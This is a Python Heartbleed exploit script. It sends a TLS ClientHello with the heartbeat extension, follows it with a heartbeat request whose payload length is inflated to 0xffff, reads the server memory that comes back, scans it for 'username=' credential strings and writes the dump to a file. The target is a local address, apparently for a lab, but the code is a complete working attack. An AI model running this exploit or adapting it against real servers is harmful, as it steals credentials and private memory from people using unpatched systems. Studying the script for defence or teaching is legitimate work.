import socket
import hexdump

def hex2bin(arr):
    return ''.join('{:02x}'.format(x) for x in arr)

tls_ver = 0x02

client_hello = [
    # tls header ( 5 bytes)
    0x16,                           # content type (0x16 for handshake)
    0x03, tls_ver,                  # tls version
    0x00, 0x34,                     # length

    # handshake header
    0x01,                           # type (0x01 for clienthello)
    0x00, 0x00, 0x30,               # length
    0x03, tls_ver,                  # tls version

    # random payload data (32 byte) - "CODE" repeated x8 times
    0x43, 0x4f, 0x44, 0x45, 0x43, 0x4f, 0x44, 0x45,
    0x43, 0x4f, 0x44, 0x45, 0x43, 0x4f, 0x44, 0x45,
    0x43, 0x4f, 0x44, 0x45, 0x43, 0x4f, 0x44, 0x45,
    0x43, 0x4f, 0x44, 0x45, 0x43, 0x4f, 0x44, 0x45,

    0x00,                           #session ID length (would be followed by session ID if non-zero)

    0x00, 0x02,                     # Cipher suites length in bytes

    # List of cipher suites supported, each are 2bytes
    0x00, 0x2f,                     # Cipher suite RSA/RSA/AES 128/CBC/SHA (RFC 5246)
    0x01,                           # number of compression methods to follow
    0x00,                           # the compression method "no compression"
    0x00, 0x05,                     # length of extensions
    # 0xff, 0x01, 0x00, 0x01, 0x00,   # Extension: renegotiation info
    0x00, 0x0f, 0x00, 0x01, 0x01   # Extension: HB
]

tls_hello = bytes.fromhex(hex2bin(client_hello))

# tls_heartbeat_s = [
#     0x18,                               # Content Type (Heartbeat)
#     0x03, tls_ver,                      # TLS version
#     0x00, 0x03,                         # Actual Payload Length (+ overhead of 3 bytes)
#     0x01,                               # Type (Request)
#     0xff, 0xff,                         # Maliciously Crafted Payload length!!
#     # 0x70, 0x6F, 0x74, 0x61, 0x74, 0x6F  # Payload Data (potato, 6b)
# ]

tls_heartbeat_s = [
    0x18,                               # Content Type (Heartbeat)
    0x03, tls_ver,                      # TLS version
    0x00, 0x09,                         # Actual Payload Length (+ overhead of 3 bytes)
    0x01,                               # Type (Request)
    0xff, 0xff,                         # Maliciously Crafted Payload length!!
    0x70, 0x6F, 0x74, 0x61, 0x74, 0x6F  # Payload Data (potato, 6b)
]

tls_heartbeat = bytes.fromhex(hex2bin(tls_heartbeat_s))

print(f"--------------------------------------")
print(f"HeartBeat Request:")
hexdump.hexdump(tls_heartbeat)
print(f"--------------------------------------\n")

def findCredentials(r, key):
    startIndex = r.find(key.encode())

    if startIndex == -1:
        return -1

    # Find first non-decodable character.
    endIndex = startIndex + len(key)
    trucking = True
    while trucking and endIndex < len(r) - 1:
        try:
            c = r[startIndex:endIndex + 1]
            ss = c.decode('utf-8')
            endIndex += 1
        except UnicodeDecodeError:
            trucking = False
    print(f"Possible sensitive credentials: ")
    print(r[startIndex:endIndex].decode('utf-8'))
    
    return endIndex

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_address = ('127.0.0.1', 4433)
print('[Connecting to {} port {}]'.format(*server_address))
s.connect(server_address)

try:
    s.sendall(tls_hello)     # Send Client Hello
    s.recv(8 * 1024)         # Receive Server Hello, Certificate, Server Hello Done
    s.sendall(tls_heartbeat) # Send badly formed Heartbeat Request
    r = s.recv(64*1024)      # Receive server memory!

    index = 0
    while index < len(r) and index != -1:
        index = findCredentials(r[index:], "username=")
    print(f"\nComplete hexdump saved to hexd.hex\n")
    # hexdump.hexdump(r)
    with open("hexd.hex", "wb") as f:
        f.write(r)
    try:
        if 'y' == str(input("Enter Y to view the hexdump ")[0]):
            hexdump.hexdump(r)
    except IndexError:
        pass

finally:
    print('[Closing socket]')
    s.close()